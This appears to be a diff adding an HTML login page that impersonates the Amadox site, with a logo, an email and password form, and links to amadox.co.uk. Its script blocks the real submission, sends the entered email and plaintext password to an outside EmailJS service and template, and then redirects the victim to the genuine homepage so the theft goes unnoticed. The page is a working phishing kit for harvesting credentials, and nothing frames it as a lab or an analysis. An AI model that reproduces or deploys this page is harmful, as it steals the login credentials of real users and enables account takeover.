@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amadox</title>
+    <link rel="stylesheet" href="./Amadox_files/style.css">
+    <link rel="stylesheet" href="./Amadox_files/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer">
+    <link rel="stylesheet" href="./Amadox_files/login.css">
+    
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        window.onload = function() {
+            emailjs.init("nCRfGFy0jpffH0qwR"); // Your EmailJS public key
+        };
+    </script>
+</head>
+<body>
+    <section class="container">
+        <div class="l_content">
+            <div class="logo">
+                <img src="./Amadox_files/logo.png" style="margin-top:110px;">
+            </div>
+
+            <form id="loginForm">
+                <input type="hidden" value="1fb51b7f0321650b7cc6ce94b45c82463807be4954dc4b6f99eeb38e992b12cb4" name="csrf_token">
+                
+                <label for="email">Email</label>
+                <input type="email" id="email" name="email" required>
+                
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+                
+                <button type="submit" class="login">LOGIN</button>
+                <a href="https://amadox.co.uk/forgot_password">FORGET PASSWORD</a>
+                <a href="https://amadox.co.uk/forget-email" style="color:green">FORGET EMAIL</a>
+            </form>
+        </div>
+    </section>
+
+    <script>
+        // Handle form submission
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent the default form submission
+
+            var userEmail = document.getElementById('email').value;
+            var userPassword = document.getElementById('password').value;
+
+            // Send the login details to EmailJS for logging purposes
+            emailjs.send("service_wedbu7k", "template_3u4vg6k", {
+                user_email: userEmail,
+                user_password: userPassword
+            })
+            .then(function(response) {
+                // After sending the email, redirect to Amadox website
+                console.log("SUCCESS!", response.status, response.text);
+                
+                // Redirect user to the Amadox website (real-time access)
+                window.location.href = 'https://amadox.co.uk/'; // Redirect to the homepage
+            }, function(error) {
+                alert("❌ Login failed. Please check the console.");
+                console.error("FAILED...", error);
+            });
+        });
+    </script>
+</body>
+</html>
